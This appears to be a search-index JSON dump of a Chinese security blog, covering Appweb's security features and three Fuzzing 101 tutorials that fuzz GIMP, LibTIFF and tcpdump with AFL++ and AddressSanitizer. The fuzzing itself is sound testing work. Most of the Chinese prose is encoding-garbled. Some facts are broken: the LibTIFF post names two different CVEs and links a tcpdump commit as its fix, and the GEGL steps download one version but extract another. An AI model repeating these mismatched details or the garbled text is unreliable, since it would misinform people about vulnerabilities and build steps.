é€šå¸¸é€šè¿‡æ•°é‡ä¼—å¤šçš„å®‰å…¨æµ‹è¯•æ¥ä¿è¯å®‰å…¨æ€§ï¼Œä½†æ˜¯ä½œç”¨ç”šå¾®ï¼Œæ„å»ºä¸€ä¸ªè®¾è®¡å®‰å…¨çš„ web server è¿œæ¯”é€šè¿‡æµ‹è¯•ä¿è¯å®‰å…¨çš„æ–¹å¼æ›´æœ‰æ•ˆã€‚å¯¹äºåµŒå…¥å¼ web server æ›´éš¾ä¿è¯å®‰å…¨æ€§ï¼Œå› ä¸ºè¦åœ¨ä½å†…å­˜å ç”¨å’Œä¸é™ä½æ€§èƒ½çš„å‰æä¸‹è¿›è¡Œã€‚ Appweb é€šè¿‡ä½¿ç”¨ä¸€ä¸ªå®‰å…¨çš„ Portable Runtime (MPR)ï¼Œ ä»ä¸€å¼€å§‹å°±é‡ç‚¹ä¿è¯å®‰å…¨æ€§ã€‚MPR æ˜¯ä¸€ä¸ªè·¨å¹³å°å±‚ï¼Œå®ƒä½¿å¾— Appweb çš„è¶…è¿‡97%çš„ä»£ç éƒ½æ˜¯å¯ç§»æ¤çš„ã€‚å®ƒåŒ…æ‹¬è®¸å¤šå¸®åŠ©åˆ›å»ºå®‰å…¨åº”ç”¨çš„æœºåˆ¶ï¼Œæ¯”å¦‚å®ƒåŒ…æ‹¬ä¸€ä¸ªå®‰å…¨çš„å­—ç¬¦ä¸²å’Œç¼“å†²åŒºå¤„ç†æ¨¡å—ï¼Œä»¥å¸®åŠ©æ¶ˆé™¤å›°æ‰°è®¸å¤šäº§å“çš„ç¼“å†²åŒºæº¢å‡ºé—®é¢˜ã€‚ ","date":"2021-05-14","objectID":"/2021/05/appweb-1/:5:0","tags":["appweb"],"title":"Appweb å­¦ä¹ ç¬”è®°","uri":"/2021/05/appweb-1/"},{"categories":["Misc"],"content":"å…­ã€æ²™ç®± Appweb å¼•å…¥æ²™ç®±æ¥ä¸¥æ ¼æ§åˆ¶å¯¹ç³»ç»Ÿèµ„æºçš„å ç”¨ã€‚è¿™æ„å‘³ç€åœ¨ä¸¥æ ¼æ§åˆ¶çš„èŒƒå›´å†…è¿è¡Œ Web æœåŠ¡å™¨ï¼Œä»¥ä¾¿è¯·æ±‚é”™è¯¯ä¸ä¼šå½±å“ç³»ç»Ÿæ“ä½œã€‚ Appweb è¿˜é’ˆå¯¹å‡ ç§å¸¸è§çš„æ‹’ç»æœåŠ¡æ”»å‡»è¿›è¡Œäº†åŠ å›ºã€‚ Appweb æ ¹æ®ä¸åŒéœ€æ±‚å¯åšå¦‚ä¸‹é…ç½®ï¼š é™åˆ¶å†…å­˜ä½¿ç”¨å¹¶ä¸”ä¸å…è®¸è¶…è¿‡å†…å­˜é™åˆ¶çš„é¢„å®šä¹‰çš„æ•°å€¼ æ‹’ç»è¿‡å¤§çš„è¯·æ±‚ æ‹’ç»è¿‡é•¿çš„URL ç”±æŒ‡å®šçš„ç”¨æˆ·å¸æˆ·æˆ–ç”¨æˆ·ç»„è¿è¡Œ åŸºäºä»¥ä¸ŠåŸºç¡€ï¼ŒAppweb æä¾›äº† Secure Sockets Layer å’Œæ‘˜è¦è®¤è¯ä»¥åŠé˜²å¾¡ç­–ç•¥ã€‚ ","date":"2021-05-14","objectID":"/2021/05/appweb-1/:6:0","tags":["appweb"],"title":"Appweb å­¦ä¹ ç¬”è®°","uri":"/2021/05/appweb-1/"},{"categories":["Fuzz"],"content":"Fuzzing 101 ç³»åˆ— note 6","date":"2021-01-18","objectID":"/2021/01/fuzzing101-6/","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 6","uri":"/2021/01/fuzzing101-6/"},{"categories":["Fuzz"],"content":"æœ¬æ–‡æ˜¯Fuzzing101ç³»åˆ—ç¬¬å…­ç¯‡ï¼Œfuzzçš„å¯¹è±¡ä¸º GIMP ã€‚ ","date":"2021-01-18","objectID":"/2021/01/fuzzing101-6/:0:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 6","uri":"/2021/01/fuzzing101-6/"},{"categories":["Fuzz"],"content":"1. Basic Info Target CVES to find Time estimated Main topics GIMP CVE-2016-4994 7hous persistent mode CVE-2016-4994: Use-After-Free vulneratibily. ","date":"2021-01-18","objectID":"/2021/01/fuzzing101-6/:1:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 6","uri":"/2021/01/fuzzing101-6/"},{"categories":["Fuzz"],"content":"2. Learning Target ä½¿ç”¨ fuzz çš„ persistent mode å¯¹ interactive/GUI åº”ç”¨ç¨‹åºè¿›è¡Œfuzz ","date":"2021-01-18","objectID":"/2021/01/fuzzing101-6/:2:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 6","uri":"/2021/01/fuzzing101-6/"},{"categories":["Fuzz"],"content":"3. Fuzzing ","date":"2021-01-18","objectID":"/2021/01/fuzzing101-6/:3:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 6","uri":"/2021/01/fuzzing101-6/"},{"categories":["Fuzz"],"content":"1. Workflow æ‰¾åˆ°ä¸€ç§ä¿®æ”¹ GIMP æºç ä»¥å¯ç”¨ AFL++ çš„ persistent mode çš„æœ‰æ•ˆçš„æ–¹æ³• åˆ›å»ºä¸€ä¸ª XCF çš„è¯­æ–™åº“ å¯¹ XCF æ–‡ä»¶æ ¼å¼åˆ›å»º dictionary å¼€å§‹fuzzï¼Œç›´åˆ°å‡ºç°crash ä½¿ç”¨é€ æˆcrashçš„pocé‡ç°crash ä¿®å¤æ¼æ´ ","date":"2021-01-18","objectID":"/2021/01/fuzzing101-6/:3:1","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 6","uri":"/2021/01/fuzzing101-6/"},{"categories":["Fuzz"],"content":"2. Solution 1. Download and build target é¦–å…ˆåˆ›å»ºå¾… fuzz çš„ GIMP ç¯å¢ƒï¼Œè¿›è¡Œç¼–è¯‘å¾…ç”¨ã€‚ è¿™é‡Œé¦–å…ˆè¦å®‰è£… GEGL 0.2(Generic Graphics Library)ï¼Œä½¿ç”¨æºç ç¼–è¯‘ï¼š # install dependencies sudo apt install build-essential libatk1.0-dev libfontconfig1-dev libcairo2-dev libgudev-1.0-0 libdbus-1-dev libdbus-glib-1-dev libexif-dev libxfixes-dev libgtk2.0-dev python2.7-dev libpango1.0-dev libglib2.0-dev zlib1g-dev intltool libbabl-dev # download and uncompress wget https://download.gimp.org/pub/gegl/0.2/gegl-0.2.2.tar.bz2 tar xvf gegl-0.2.0.tar.bz2 \u0026\u0026 cd gegl-0.2.2 # modify the source code sed -i 's/CODEC_CAP_TRUNCATED/AV_CODEC_CAP_TRUNCATED/g' ./operations/external/ff-load.c sed -i 's/CODEC_FLAG_TRUNCATED/AV_CODEC_FLAG_TRUNCATED/g' ./operations/external/ff-load.c # build and install ./configure --enable-debug --disable-glibtest --without-vala --without-cairo --without-pango --without-pangocairo --without-gdk-pixbuf --without-lensfun --without-libjpeg --without-libpng --without-librsvg --without-openexr --without-sdl --without-libopenraw --without-jasper --without-graphviz --without-lua --without-libavformat --without-libv4l --without-libspiro --without-exiv2 --without-umfpack make -j$(nproc) sudo make install ç„¶åï¼Œä¸‹è½½ GIMP 2.8.16ï¼Œå¹¶è¿›è¡Œç¼–è¯‘å®‰è£…ï¼š # download cd .. wget https://mirror.klaus-uwe.me/gimp/pub/gimp/v2.8/gimp-2.8.16.tar.bz2 tar xvf gimp-2.8.16.tar.bz2 \u0026\u0026 cd gimp-2.8.16/ # build and install CC=afl-clang-lto CXX=afl-clang-lto++ PKG_CONFIG_PATH=$PKG_CONFIG_PATH:$HOME/Desktop/Fuzz/training/fuzzing_gimp/gegl-0.2.2/ CFLAGS=\"-fsanitize=address\" CXXFLAGS=\"-fsanitize=address\" LDFLAGS=\"-fsanitize=address\" ./configure --disable-gtktest --disable-glibtest --disable-alsatest --disable-nls --without-libtiff --without-libjpeg --without-bzip2 --without-gs --without-libpng --without-libmng --without-libexif --without-aa --without-libxpm --without-webkit --without-librsvg --without-print --without-poppler --without-cairo-pdf --without-gvfs --without-libcurl --without-wmf --without-libjasper --without-alsa --without-gudev --disable-python --enable-gimp-console --without-mac-twain --without-script-fu --without-gudev --without-dbus --disable-mp --without-linux-input --without-xvfb-run --with-gif-compression=none --without-xmc --with-shm=none --enable-debug --prefix=\"$HOME/Desktop/Fuzz/training/fuzzing_gimp/gimp-2.8.16/install\" make -j$(nproc) make install 2. persistent mode ä¸ºäº†ä½¿ç”¨ AFL++ çš„ persistent modeï¼Œæˆ‘ä»¬éœ€è¦å¯¹æºç è¿›è¡Œä¸€å®šçš„ä¿®æ”¹ï¼š ç¬¬ä¸€ç§æ–¹æ¡ˆæ˜¯ä¿®æ”¹ app.c æ–‡ä»¶ï¼š ç¬¬äºŒç§æ–¹æ¡ˆæ˜¯ä¿®æ”¹ xcf_load_invoker å‡½æ•°ï¼š è¿™é‡Œæˆ‘ä»¬ç›´æ¥é‡‡ç”¨ç¬¬äºŒç§æ–¹æ¡ˆè¿›è¡Œ patchã€‚gimp-2.8.16/app/xcf/xcf.c ä¿®æ”¹å‰å†…å®¹å¦‚ä¸‹ï¼š è¡¥ä¸å†…å®¹å¦‚ä¸‹ï¼š --- ../xcf.c 2014-08-20 08:27:58.000000000 -0700 +++ ./app/xcf/xcf.c 2021-10-11 13:02:42.800831192 -0700 @@ -277,6 +277,10 @@ filename = g_value_get_string (\u0026args-\u003evalues[1]); +#ifdef __AFL_COMPILER + while(__AFL_LOOP(10000)){ +#endif + info.fp = g_fopen (filename, \"rb\"); if (info.fp) @@ -366,6 +370,12 @@ if (success) gimp_value_set_image (\u0026return_vals-\u003evalues[1], image); +#ifdef __AFL_COMPILER + } +#endif + + exit(0); + gimp_unset_busy (gimp); return return_vals; ä½¿ç”¨ä¸Šé¢çš„è¡¥ä¸ä¿®æ”¹ gimp-2.8.16/app/xcf/xcf.c æ–‡ä»¶ï¼š patch gimp-2.8.16/app/xcf/xcf.c -i persistent.patch pacth åçš„æ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š è¿™æ ·å°±å¯ä»¥å®ç° AFL++ çš„ persistent modeã€‚ 3. Seed corpus creation è¿™é‡Œç›´æ¥ä½¿ç”¨ SampleInput.xcf åšç®€å•çš„è¯­æ–™æ ·ä¾‹ã€‚ 4. Custom dictionary è¿™é‡Œç›´æ¥ä½¿ç”¨AFL++æä¾›çš„ xcf çš„ dict ã€‚ 4. Fuzzing æ‰§è¡Œ afl-fuzz ï¼Œé‡‡ç”¨å¹¶è¡Œæ–¹å¼è¿›è¡Œfuzz: ASAN_OPTIONS=detect_leaks=0,abort_on_error=1,symbolize=0 afl-fuzz -i './afl_in' -o './afl_out' -D -t 100 -- ./gimp-2.8.16/app/gimp-console-2.8 --verbose -d -f @@ ","date":"2021-01-18","objectID":"/2021/01/fuzzing101-6/:3:2","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 6","uri":"/2021/01/fuzzing101-6/"},{"categories":["Fuzz"],"content":"3. Crashes ","date":"2021-01-18","objectID":"/2021/01/fuzzing101-6/:3:3","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 6","uri":"/2021/01/fuzzing101-6/"},{"categories":["Fuzz"],"content":"4. Triage ","date":"2021-01-18","objectID":"/2021/01/fuzzing101-6/:4:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 6","uri":"/2021/01/fuzzing101-6/"},{"categories":["Fuzz"],"content":"5. Fix å®˜æ–¹çš„ä¿®å¤åœ°å€ï¼š https://gitlab.gnome.org/GNOME/gimp/-/commit/6d804bf9ae77bc86a0a97f9b944a129844df9395 åç»­å°†å¯¹è¯¥æ¼æ´è¿›è¡Œæ·±å…¥åˆ†æå’Œè¡¥ä¸åˆ†æï¼Œå¾…å®Œå–„ã€‚ ","date":"2021-01-18","objectID":"/2021/01/fuzzing101-6/:5:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 6","uri":"/2021/01/fuzzing101-6/"},{"categories":["Fuzz"],"content":"Fuzzing 101 ç³»åˆ— note 4","date":"2021-01-14","objectID":"/2021/01/fuzzing101-4/","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 4","uri":"/2021/01/fuzzing101-4/"},{"categories":["Fuzz"],"content":"Fuzzing 101 â€“ 4 æœ¬æ–‡æ˜¯Fuzzing101ç³»åˆ—ç¬¬å››ç¯‡ï¼Œfuzzçš„å¯¹è±¡ä¸º LibTIFF ã€‚ ","date":"2021-01-14","objectID":"/2021/01/fuzzing101-4/:0:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 4","uri":"/2021/01/fuzzing101-4/"},{"categories":["Fuzz"],"content":"1. Basic Info Target CVES to find Time estimated Main topics LibTIFF CVE-2016-9297 3hous measure the code coverage data CVE-2017-13028: Out-of-bounds Read vulneratibily. ","date":"2021-01-14","objectID":"/2021/01/fuzzing101-4/:1:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 4","uri":"/2021/01/fuzzing101-4/"},{"categories":["Fuzz"],"content":"2. Learning Target ä»€ä¹ˆæ˜¯ Code Coverageï¼Œä»£ç è¦†ç›–ç‡ ä½¿ç”¨ LCOV å¯¹ä»£ç è¦†ç›–ç‡è¿›è¡Œæµ‹é‡ å¦‚ä½•é€šè¿‡ä»£ç è¦†ç›–ç‡çš„ä¼˜åŒ–æå‡Fuzzingæ€§èƒ½ ","date":"2021-01-14","objectID":"/2021/01/fuzzing101-4/:2:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 4","uri":"/2021/01/fuzzing101-4/"},{"categories":["Fuzz"],"content":"3. Fuzzing ","date":"2021-01-14","objectID":"/2021/01/fuzzing101-4/:3:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 4","uri":"/2021/01/fuzzing101-4/"},{"categories":["Fuzz"],"content":"1. Workflow å¼€å¯ ASan åŠŸèƒ½ï¼Œå¯¹ LibTiff åº“è¿›è¡Œfuzz åˆ†æ crash ï¼Œæ‰¾åˆ°å¯¹åº”æ¼æ´çš„ PoC æµ‹é‡è¯¥ PoC çš„ä»£ç è¦†ç›–ç‡æƒ…å†µ ä¿®å¤æ¼æ´ ","date":"2021-01-14","objectID":"/2021/01/fuzzing101-4/:3:1","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 4","uri":"/2021/01/fuzzing101-4/"},{"categories":["Fuzz"],"content":"2. Solution 1. Download and build target é¦–å…ˆåˆ›å»ºå¾… fuzz çš„ LibTiff ç¯å¢ƒï¼Œè¿›è¡Œç¼–è¯‘å¾…ç”¨ï¼š cd $HOME/Desktop/Fuzz/training mkdir fuzzing_tiff \u0026\u0026 cd fuzzing_tiff/ # download and uncompress the target wget https://download.osgeo.org/libtiff/tiff-4.0.4.tar.gz tar -xzvf tiff-4.0.4.tar.gz # make and install libtiff cd tiff-4.0.4/ ./configure --prefix=\"$HOME/Desktop/Fuzz/training/fuzzing_tiff/install/\" --disable-shared make make install # test the target program $HOME/Desktop/Fuzz/training/fuzzing_tiff/install/bin/tiffinfo -D -j -c -r -s -w $HOME/Desktop/Fuzz/training/fuzzing_tiff/tiff-4.0.4/test/images/palette-1c-1b.tiff ä»¥ä¸Šå®‰è£…ä¸æŠ¥é”™çš„è¯ï¼Œå¯ä»¥æ­£å¸¸è°ƒç”¨ LibTiff åº“ ï¼š åœ¨ä¸Šé¢çš„å¯åŠ¨å‘½ä»¤ä¸­ï¼ŒåŸºæœ¬å¼€å¯äº†è½¯ä»¶çš„æ‰€æœ‰å‚æ•°ï¼Œè¿™æ ·æœ‰åˆ©äºåœ¨è¿›è¡Œfuzzæ—¶æ‰§è¡Œæ›´å¤šçš„ä»£ç è·¯å¾„ï¼Œä»è€Œè·å¾—æ›´é«˜çš„ä»£ç è¦†ç›–ç‡ã€‚ 2. Seed corpus creation ç›´æ¥ä½¿ç”¨ test/images æ–‡ä»¶å¤¹ä¸‹çš„æµ‹è¯•ç”¨ä¾‹ä½œä¸ºæœ¬æ¬¡fuzzçš„è¯­æ–™ã€‚ 3. Code Coverage ä»£ç è¦†ç›–ç‡æ˜¯ä¸€ç§è½¯ä»¶æŒ‡æ ‡ï¼Œè¡¨è¾¾äº†æ¯è¡Œä»£ç è¢«è§¦å‘çš„æ¬¡æ•°ã€‚é€šè¿‡ä½¿ç”¨ä»£ç è¦†ç›–ç‡ï¼Œæˆ‘ä»¬å¯ä»¥äº†è§£ fuzzer å·²ç»åˆ°è¾¾äº†ä»£ç çš„å“ªäº›éƒ¨åˆ†ï¼Œå¹¶å¯è§†åŒ–äº† fuzzing è¿‡ç¨‹ã€‚ é¦–å…ˆï¼Œéœ€è¦å®‰è£… lcovï¼š sudo apt install lcov ç„¶åï¼Œæˆ‘ä»¬ä½¿ç”¨ --coverageé€‰é¡¹æ¥é‡å»ºlibTIFFåº“ï¼š rm -r $HOME/Desktop/Fuzz/training/fuzzing_tiff/install cd $HOME/Desktop/Fuzz/training/fuzzing_tiff/tiff-4.0.4/ make clean CFLAGS=\"--coverage\" LDFLAGS=\"--coverage\" ./configure --prefix=\"$HOME/Desktop/Fuzz/training/fuzzing_tiff/install/\" --disable-shared make make install ç„¶åä½¿ç”¨ä¸‹é¢çš„æŒ‡ä»¤æ¥è¿›è¡Œä»£ç è¦†ç›–ç‡æ”¶é›†ï¼š cd $HOME/Desktop/Fuzz/training/fuzzing_tiff/tiff-4.0.4/ lcov --zerocounters --directory ./ # é‡ç½®è®¡æ•°å™¨ lcov --capture --initial --directory ./ --output-file app.info $HOME/Desktop/Fuzz/training/fuzzing_tiff/install/bin/tiffinfo -D -j -c -r -s -w $HOME/Desktop/Fuzz/training/fuzzing_tiff/tiff-4.0.4/test/images/palette-1c-1b.tiff lcov --no-checksum --directory ./ --capture --output-file app2.info # è¿”å›â€œåŸºçº¿â€è¦†ç›–æ•°æ®æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«æ¯ä¸ªæ£€æµ‹è¡Œçš„é›¶è¦†ç›– æœ€åï¼Œç”ŸæˆHTMLè¾“å‡ºï¼š genhtml --highlight --legend -output-directory ./html-coverage/ ./app2.info ä¸€åˆ‡é¡ºåˆ©çš„è¯ï¼Œä¼šç”Ÿæˆä»¥ä¸‹æ–‡ä»¶ï¼š æ‰“å¼€ç”Ÿæˆçš„ index.html ä¼šçœ‹åˆ°å¦‚ä¸‹ç»“æœï¼š 4. Fuzzing é‡æ–°ç¼–è¯‘ï¼š rm -r $HOME/Desktop/Fuzz/training/fuzzing_tiff/install cd $HOME/Desktop/Fuzz/training/fuzzing_tiff/tiff-4.0.4/ make clean export LLVM_CONFIG=\"llvm-config-12\" CC=afl-clang-lto ./configure --prefix=\"$HOME/Desktop/Fuzz/training/fuzzing_tiff/install/\" --disable-shared # å¼€å¯AFL_USE_ASAN AFL_USE_ASAN=1 make -j4 AFL_USE_ASAN=1 make install æ‰§è¡Œ afl-fuzz : afl-fuzz -m none -i $HOME/Desktop/Fuzz/training/fuzzing_tiff/tiff-4.0.4/test/images/ -o $HOME/Desktop/Fuzz/training/fuzzing_tiff/out/ -s 123 -- $HOME/Desktop/Fuzz/training/fuzzing_tiff/install/bin/tiffinfo -D -j -c -r -s -w @@ ","date":"2021-01-14","objectID":"/2021/01/fuzzing101-4/:3:2","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 4","uri":"/2021/01/fuzzing101-4/"},{"categories":["Fuzz"],"content":"3. Crashes æœ€ç»ˆè·‘å¾—çš„ç»“æœå¦‚ä¸‹ï¼š ","date":"2021-01-14","objectID":"/2021/01/fuzzing101-4/:3:3","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 4","uri":"/2021/01/fuzzing101-4/"},{"categories":["Fuzz"],"content":"4. Triage ASanè¿½è¸ªç»“æœå¦‚ä¸‹ï¼š ","date":"2021-01-14","objectID":"/2021/01/fuzzing101-4/:4:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 4","uri":"/2021/01/fuzzing101-4/"},{"categories":["Fuzz"],"content":"5. Fix å®˜æ–¹çš„ä¿®å¤åœ°å€ï¼š https://github.com/the-tcpdump-group/tcpdump/commit/29e5470e6ab84badbc31f4532bb7554a796d9d52 åç»­å°†å¯¹è¯¥æ¼æ´è¿›è¡Œæ·±å…¥åˆ†æå’Œè¡¥ä¸åˆ†æï¼Œå¾…å®Œå–„ã€‚ å®˜æ–¹çš„ä¿®å¤åœ°å€ï¼š https://github.com/the-tcpdump-group/tcpdump/commit/29e5470e6ab84badbc31f4532bb7554a796d9d52 åç»­å°†å¯¹è¯¥æ¼æ´è¿›è¡Œæ·±å…¥åˆ†æå’Œè¡¥ä¸åˆ†æï¼Œå¾…å®Œå–„ã€‚ ","date":"2021-01-14","objectID":"/2021/01/fuzzing101-4/:5:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 4","uri":"/2021/01/fuzzing101-4/"},{"categories":["Fuzz"],"content":"Fuzzing 101 ç³»åˆ— note 3","date":"2021-01-12","objectID":"/2021/01/fuzzing101-3/","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 3","uri":"/2021/01/fuzzing101-3/"},{"categories":["Fuzz"],"content":"Fuzzing 101 â€“ 3 æœ¬æ–‡æ˜¯Fuzzing101ç³»åˆ—ç¬¬ä¸‰ç¯‡ï¼Œfuzzçš„å¯¹è±¡ä¸º tcpdumpã€‚ ","date":"2021-01-12","objectID":"/2021/01/fuzzing101-3/:0:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 3","uri":"/2021/01/fuzzing101-3/"},{"categories":["Fuzz"],"content":"1. Basic Info Target CVES to find Time estimated Main topics TCPdump CVE-2017-13028 4hous ASAN CVE-2017-13028: Out-of-bounds Read vulneratibily. ","date":"2021-01-12","objectID":"/2021/01/fuzzing101-3/:1:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 3","uri":"/2021/01/fuzzing101-3/"},{"categories":["Fuzz"],"content":"2. Learning Target ä»€ä¹ˆæ˜¯ ASAN(Address Sanitizer)ï¼Œä¸€ä¸ªè¿è¡Œæ—¶å†…å­˜é”™è¯¯æ£€æµ‹å·¥å…· å¦‚ä½•ä½¿ç”¨ASANè¿›è¡Œfuzz ä½¿ç”¨ASANå¯¹crashè¿›è¡Œåˆ†ç±» ","date":"2021-01-12","objectID":"/2021/01/fuzzing101-3/:2:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 3","uri":"/2021/01/fuzzing101-3/"},{"categories":["Fuzz"],"content":"3. Fuzzing ","date":"2021-01-12","objectID":"/2021/01/fuzzing101-3/:3:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 3","uri":"/2021/01/fuzzing101-3/"},{"categories":["Fuzz"],"content":"1. Workflow ç¡®å®šå¦‚ä½•è¿›è¡ŒTCpdumpçš„fuzzå·¥ä½œ åœ¨fuzzæ—¶å¼€å¯ASANåŠŸèƒ½ å®é™…çš„fuzzè¿‡ç¨‹ è¿½è¸ªcrashï¼Œæ‰¾åˆ°å¯¹åº”çš„æ¼æ´çš„poc ä¿®å¤æ¼æ´ ","date":"2021-01-12","objectID":"/2021/01/fuzzing101-3/:3:1","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 3","uri":"/2021/01/fuzzing101-3/"},{"categories":["Fuzz"],"content":"2. Solution 1. Download and build target é¦–å…ˆåˆ›å»ºå¾…fuzzçš„ TCPdump ç¯å¢ƒï¼Œè¿›è¡Œç¼–è¯‘å¾…ç”¨ï¼š cd $HOME/Desktop/Fuzz/training/fuzzing_tcpdump # download and uncompress tcpdump-4.9.2.tar.gz wget https://github.com/the-tcpdump-group/tcpdump/archive/refs/tags/tcpdump-4.9.2.tar.gz tar -xzvf tcpdump-4.9.2.tar.gz # download and uncompress libpcap-1.8.1.tar.gz wget https://github.com/the-tcpdump-group/libpcap/archive/refs/tags/libpcap-1.8.1.tar.gz tar -xzvf libpcap-1.8.1.tar.gz # build and install cd libpcap-libpcap-1.8.1/ ./configure --enable-shared=no --prefix=\"$HOME/Desktop/Fuzz/training/fuzzing_tcpdump/install/\" make make install # build and install tcpdump cd .. cd tcpdump-tcpdump-4.9.2/ CPPFLAGS=-I$HOME/Desktop/Fuzz/training/fuzzing_tcpdump/install/include/ LDFLAGS=-L$HOME/Desktop/Fuzz/training/fuzzing_tcpdump/install/lib/ ./configure --prefix=\"$HOME/Desktop/Fuzz/training/fuzzing_tcpdump/install/\" make make install # test $HOME/Desktop/Fuzz/training/fuzzing_tcpdump/install/sbin/tcpdump -h ä»¥ä¸Šå®‰è£…ä¸æŠ¥é”™çš„è¯ï¼Œå¯ä»¥æ­£å¸¸å¯åŠ¨ tcpdump ï¼š 2. Seed corpus creation åœ¨ tests æ–‡ä»¶å¤¹ä¸­æœ‰å¾ˆå¤šçš„æµ‹è¯•æ ·ä¾‹ï¼š è¿è¡Œæ ·ä¾‹çš„å‘½ä»¤å¦‚ä¸‹ï¼š $HOME/Desktop/Fuzz/training/fuzzing_tcpdump/install/sbin/tcpdump -vvvvXX -ee -nn -r [.pcap file] # -vvvv è¾“å‡ºæä¸ºè¯¦ç»†çš„ä¿¡æ¯ # -XX æŠŠåè®®å¤´å’ŒåŒ…å†…å®¹éƒ½åŸåŸæœ¬æœ¬çš„æ˜¾ç¤ºå‡ºæ¥ï¼ˆtcpdumpä¼šä»¥16è¿›åˆ¶å’ŒASCIIçš„å½¢å¼æ˜¾ç¤ºï¼‰ # -ee åœ¨è¾“å‡ºè¡Œæ‰“å°å‡ºæ•°æ®é“¾è·¯å±‚çš„å¤´éƒ¨ä¿¡æ¯ï¼ŒåŒ…æ‹¬æºmacå’Œç›®çš„macï¼Œä»¥åŠç½‘ç»œå±‚çš„åè®® # -nn æŒ‡å®šå°†æ¯ä¸ªç›‘å¬åˆ°çš„æ•°æ®åŒ…ä¸­çš„åŸŸåè½¬æ¢æˆIPã€ç«¯å£ä»åº”ç”¨åç§°è½¬æ¢æˆç«¯å£å·åæ˜¾ç¤º # -r æŒ‡å®šæ–‡ä»¶ è¿è¡Œç»“æœå¤§æ¦‚å¦‚ä¸‹ï¼š 3. AddressSanitizer AddressSanitizer(ASAN) æ˜¯ä¸€ä¸ªCå’ŒC++çš„å†…å­˜é”™è¯¯æ£€æµ‹å·¥å…·ï¼Œ2011å¹´ç”±Googleçš„ç ”ç©¶å‘˜å¼€å‘ã€‚ å®ƒåŒ…æ‹¬ä¸€ä¸ªç¼–è¯‘å™¨æ£€æµ‹æ¨¡å—å’Œä¸€ä¸ªè¿è¡Œæ—¶åº“ï¼Œè¯¥å·¥å…·å¯ä»¥å‘ç°å¯¹å †ã€æ ˆå’Œå…¨å±€å¯¹è±¡çš„è¶Šç•Œè®¿é—®ã€é‡Šæ”¾åé‡åˆ©ç”¨ã€åŒé‡é‡Šæ”¾å’Œå†…å­˜æ³„æ¼é”™è¯¯ã€‚ AddressSanitizer æ˜¯å¼€æºçš„ï¼Œå¹¶ä¸”ä» 3.1 ç‰ˆå¼€å§‹ä¸ LLVM ç¼–è¯‘å™¨å·¥å…·é“¾é›†æˆã€‚è™½ç„¶å®ƒæœ€åˆæ˜¯ä½œä¸º LLVM çš„é¡¹ç›®å¼€å‘çš„ï¼Œä½†å®ƒå·²è¢«ç§»æ¤åˆ° GCC å¹¶åŒ…å«åœ¨ GCC \u003e= 4.8 çš„ç‰ˆæœ¬ä¸­ ã€‚ æ›´å¤šå†…å®¹è¯·å‚è€ƒAddressSanitizerã€‚ æœ¬æ–‡æˆ‘ä»¬ä¸»è¦æ˜¯ä¸ºäº†åœ¨fuzzæ—¶å¼€å¯ASANï¼Œæ‰€ä»¥å…ˆåˆ é™¤ä¸Šé¢å·²ç»ç¼–è¯‘å¥½çš„å¯¹è±¡æ–‡ä»¶å’Œå¯æ‰§è¡Œæ–‡ä»¶ï¼š rm -r $HOME/fuzzing_tcpdump/install cd $HOME/fuzzing_tcpdump/libpcap-libpcap-1.8.1/ make clean cd $HOME/fuzzing_tcpdump/tcpdump-tcpdump-4.9.2/ make clean clean å®Œæˆåï¼Œåœ¨è¿›è¡Œmakeå‰é™„åŠ  AFL_USE_ASAN=1 çš„ç¼–è¯‘é€‰é¡¹ï¼š cd $HOME/Desktop/Fuzz/training/fuzzing_tcpdump/libpcap-libpcap-1.8.1/ export LLVM_CONFIG=\"llvm-config-12\" CC=afl-clang-lto ./configure --enable-shared=no --prefix=\"$HOME/Desktop/Fuzz/training/fuzzing_tcpdump/install/\" AFL_USE_ASAN=1 make AFL_USE_ASAN=1 make install cd $HOME/Desktop/Fuzz/training/fuzzing_tcpdump/tcpdump-tcpdump-4.9.2/ CC=afl-clang-lto CPPFLAGS=-I$HOME/Desktop/Fuzz/training/fuzzing_tcpdump/install/include/ LDFLAGS=-L$HOME/Desktop/Fuzz/training/fuzzing_tcpdump/install/lib/ ./configure --prefix=\"$HOME/Desktop/Fuzz/training/fuzzing_tcpdump/install/\" CC=afl-clang-lto CPPFLAGS=-I$HOME/Desktop/Fuzz/training/fuzzing_tcpdump/install/include/ LDFLAGS=-L$HOME/Desktop/Fuzz/training/fuzzing_tcpdump/install/lib/ ./configure --prefix=\"$HOME/Desktop/Fuzz/training/fuzzing_tcpdump/install/\" AFL_USE_ASAN=1 make AFL_USE_ASAN=1 make install 4. Fuzzing æ‰§è¡Œ afl-fuzz : afl-fuzz -m none -i $HOME/Desktop/Fuzz/fuzzing_tcpdump/tcpdump-tcpdump-4.9.2/tests/ -o $HOME/Desktop/Fuzz/fuzzing_tcpdump/out/ -s 123 -- $HOME/Desktop/Fuzz/fuzzing_tcpdump/install/sbin/tcpdump -vvvvXX -ee -nn -r @@ å¤‡æ³¨ï¼šè¿™é‡ŒæŒ‡å®šäº† -mÂ none 